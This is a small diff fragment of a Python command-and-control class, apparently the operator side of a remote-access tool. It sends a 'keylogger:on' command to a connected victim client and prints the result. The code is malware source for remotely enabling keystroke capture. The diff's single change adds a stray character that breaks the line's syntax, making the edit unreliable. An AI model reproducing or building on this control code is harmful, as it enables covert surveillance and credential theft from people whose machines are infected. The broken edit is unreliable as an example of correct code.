@@ -430,7 +430,7 @@ class COMMCENTER:
                 if args[1] == "status":
                     return
                 elif args[1] == "on":
-                    self.CURRENT[1].send_data("keylogger:on")
+                    self.CURRENT[1].send_data("keylogger:on")w
                     result = self.CURRENT[1].recv_data()
                     if result.strip(" "):
                         print(result)
